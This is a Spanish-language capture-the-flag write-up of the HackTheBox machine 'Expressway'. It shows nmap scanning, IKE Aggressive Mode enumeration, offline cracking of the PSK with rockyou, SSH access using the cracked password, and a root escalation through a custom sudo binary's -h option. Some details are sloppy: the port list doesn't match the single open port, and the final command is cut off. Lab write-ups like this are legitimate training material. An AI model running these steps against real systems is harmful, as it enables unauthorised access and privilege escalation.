---
layout: post
title: "Expressway"
date: 2025-11-30 18:30:00 -0300
categories: [Writeups,Expressway]
tags: [Htb, Expressway, Linux]
description: "Writeup de la máquina Expressway de Hackthebox"
image: /assets/images/hackthebox.png
---
## Resumen de la resolución

**Expressway** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, es una máquina  la cual consta con simplemente un puerto abierto, requiriendo poco tiempo para explotarla.

---
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_Frasan15.opvn
```

Luego le lanzamos un **ping** para comprobar si la maquina esta activa. Verificamos que responde correctamente devolviendo el paquete enviado. A continuacion, utilizamos un script propio que, a partir del valor del  **ttl**  permite identificar el tipo de sistema operativo: **Linux (TTL 64 )** o **Windows (TTL 128)**, en este caso, observamos un **TTL** próximo a 64 (**64**) por lo que se trata de una máquina **Linux**

> El motivo por el cual el **TTL** es de **64** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.129.43.173`.

### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap 10.129.43.173 -p- --open -T5 -v -n -oG allPorts
```

Observamos como nos reporta que se encuentra abierto un solo puerto.

Ahora, gracias a la utilidad **extractPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto:

```bash
nmap -sC -sV -p21,22,139,445,3632 10.129.43.173 -oN targeted
```

En dichos escaneos de **Nmap**, lo primero que llama la atención es que simplemente el puerto 22 SSH se encuentra abierto.

### Puerto 22 - SSH 

Como **SSH** es el unico puerto abierto suponemos que utiliza **Internet Key Exchange(IKE)**, suponiendo eso utilizamos los siguienes comandos para identificar un servicio IKE activo, confirmar Aggressive Mode y extraer los parámetros necesarios para realizar un ataque offline contra la clave PSK.

```bash
ike-scan expressway.htb
ike-scan -A expressway.htb
ike-scan -A expressway.htb --id=ike@expressway.htb -P ike.psk
```
### Crack PSK

Ahora utilizaremos un comando para crackear la clave PSK de IKE

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```
El Resultado obtenido PSK fue el siguiente
**PSK: freakingrockstarontheroad**

## SSH acceso con la cuenta discovered

Teniendo esa clave intentamos acceder a la consola mediante SSH de la siguiente forma:

```bash
ssh ike@expressway.htb
```

Una vez enviamos ese comando nos pedira la contraseña y ponemos la obtenida.
Al estar dentro enviamos los siguientes comandos para lograr obtener la flag de usuario:

```bash
whoami
cat user.txt
```

## Revisión de logs y sudo binario

Como ya tenemos acceso a una cuenta de usuario el siguiente paso es buscar alguna brecha para lograr escalar privilegios.

```bash
ls -l /var/log/squid
cat /var/log/squid/access.log.1
which sudo
ls -l /usr/local/bin/sudo
```
## Ejecución que devolvió root

Al terminar de revisar los logs mencionados anteriormente conseguimos una ruta la cual nos convierte en usuario root.


```bash
/usr/local/bin/sudo -h offramp.expressway.htb bash
cat /roo
```
La maquina **Expressway** me parecio una maquina muy buena y divertida, y con muchas enseñanzas, es una maquina  muy recomendable de hacer.
